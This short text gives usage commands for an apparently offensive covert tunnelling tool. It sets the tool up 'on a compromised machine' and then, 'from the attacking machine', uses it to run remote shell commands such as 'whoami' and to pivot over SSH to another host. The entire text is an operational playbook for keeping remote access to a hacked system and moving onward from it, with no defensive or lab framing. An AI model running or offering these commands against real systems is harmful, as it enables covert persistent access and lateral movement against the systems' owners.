# 1. On a compromised machine
cd /opt/enhanced-stealth-tunnel
python3 enhanced_stealth_tunnel.py --generate-config
# Editing enhanced_tunnel_config.json
python3 enhanced_stealth_tunnel.py -c enhanced_tunnel_config.json

# 2. From the attacking machine
python3 enhanced_client.py 192.168.1.50 -k tunnel.key --shell "whoami"
python3 enhanced_client.py 192.168.1.50 -k tunnel.key --ssh 198.51.100.10
